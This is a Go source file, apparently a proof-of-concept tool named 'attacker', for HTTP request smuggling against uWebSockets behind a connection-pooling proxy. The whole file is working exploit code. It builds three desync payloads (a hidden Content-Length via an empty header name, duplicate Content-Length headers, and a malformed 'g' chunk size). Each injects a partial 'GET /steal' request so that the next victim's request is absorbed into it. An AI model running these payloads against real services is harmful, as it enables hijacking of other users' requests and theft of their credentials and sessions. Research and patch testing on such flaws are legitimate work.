// attacker: sends ONE crafted request through the proxy to prime/poison the
// pooled back-end connection. Usage: attacker <proxyAddr> <case: a|b|c>
package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

const CRLF = "\r\n"

// The smuggled request prefix uWebSockets will parse out of what the proxy
// thinks is a body. No Host, ends mid-header so it absorbs the victim's bytes.
const smug = "GET /steal HTTP/1.1" + CRLF + "X-Smuggled: "

func payload(kase string) (string, string) {
	switch kase {
	case "a": // empty header name ':' hides Content-Length from uWebSockets
		p := "POST /benign HTTP/1.1" + CRLF + "Host: t" + CRLF + ":" + CRLF +
			"Content-Length: " + strconv.Itoa(len(smug)) + CRLF + CRLF + smug
		return "A (empty header name hides Content-Length)", p
	case "b": // duplicate Content-Length: uWS uses FIRST (6), proxy uses LAST
		first := "HELLO!" // 6 bytes consumed by uWS as the /benign body
		body := first + smug
		p := "POST /benign HTTP/1.1" + CRLF + "Host: t" + CRLF +
			"Content-Length: 6" + CRLF +
			"Content-Length: " + strconv.Itoa(len(body)) + CRLF + CRLF + body
		return "B (duplicate Content-Length; uWS uses first=6)", p
	case "c": // F1 chunked: 'g' is accepted by uWS as hex digit 16 (should be rejected)
		// Proxy streams the chunked body to the '0\r\n\r\n' terminator; uWS mis-sizes
		// the 'g' chunk. See README for the exact desync this produces.
		body := "1g" + CRLF + // uWS: size 0x1*16+16 = 32 ; a strict/other parser: reject or 1
			smug + CRLF + // the smuggled request, counted by uWS as chunk data
			"0" + CRLF + CRLF
		p := "POST /echo HTTP/1.1" + CRLF + "Host: t" + CRLF +
			"Transfer-Encoding: chunked" + CRLF + CRLF + body
		return "C (F1 chunked 'g'=16 chunk-size disagreement)", p
	}
	return "", ""
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("usage: attacker <proxyAddr> <case a|b|c>")
		os.Exit(2)
	}
	addr, kase := os.Args[1], os.Args[2]
	name, p := payload(kase)
	if p == "" {
		fmt.Println("unknown case:", kase)
		os.Exit(2)
	}
	fmt.Printf("[ATTACKER] case %s\n", name)
	c, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Println("[ATTACKER] dial err:", err)
		os.Exit(1)
	}
	defer c.Close()
	c.Write([]byte(p))
	var out []byte
	buf := make([]byte, 4096)
	for {
		c.SetReadDeadline(time.Now().Add(600 * time.Millisecond))
		n, err := c.Read(buf)
		out = append(out, buf[:n]...)
		if err != nil {
			break
		}
	}
	fmt.Printf("[ATTACKER] response:\n%s\n", string(out))
}
